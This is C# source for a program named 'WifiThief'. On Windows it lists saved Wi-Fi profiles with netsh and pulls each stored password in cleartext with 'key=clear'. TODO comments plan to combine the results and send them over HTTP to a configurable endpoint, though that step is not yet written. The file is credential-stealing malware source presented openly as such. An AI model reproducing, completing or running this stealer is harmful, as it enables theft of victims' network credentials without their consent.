using System.Runtime.InteropServices;
using WifiThief.Commands;

internal class Program
{
    static void Main()
    {
        List<string> wifiNames = [];
        List<string> wifiPasswords = [];

        switch (RuntimeInformation.OSDescription)
        {
            case string os when os.Contains("Windows"):
                wifiNames = GetWiFiNamesWindows();
                wifiPasswords = GetWiFiPasswordsWindows(wifiNames);
                break;

            case string os when os.Contains("OS X") || os.Contains("macOS"):
                // Handle macOS
                break;

            case string os when os.Contains("Linux"):
                // Handle Linux
                break;

            default:
                Console.Error.WriteLine("Unsupported operating system.");
                break;
        }

        // todo: adding object building to combine wifi and password
        // todo: add http call to configurable endpoint to send response object
    }

    private static List<string> GetWiFiNamesWindows()
    {
        var wifiNames = new List<string>();

        string output = CommandUtilities.RunCmdCommand(CommandUtilities.GetWifiNameCommandWindows);

        string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

        foreach (string line in lines)
        {
            if (line.Contains("All User Profile"))
            {
                string name = line.Split(':', StringSplitOptions.TrimEntries)[1].Trim();
                wifiNames.Add(name);
            }
        }

        return wifiNames;
    }

    private static List<string> GetWiFiPasswordsWindows(List<string> wifiNames)
    {
        var wifiPasswords = new List<string>(wifiNames.Count);

        foreach (string wifiName in wifiNames)
        {
            string output = CommandUtilities.RunCmdCommand($"netsh wlan show profile name=\"{wifiName}\" key=clear");

            string password = FindAndExtractPassword(output);

            wifiPasswords.Add(password);
        }

        return wifiPasswords;
    }

    private static string FindAndExtractPassword(string output)
    {
        string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

        foreach (string line in lines)
        {
            if (line.Contains("Key Content"))
            {
                return line.Split(':', StringSplitOptions.TrimEntries)[1].Trim();
            }
        }

        return string.Empty;
    }
}
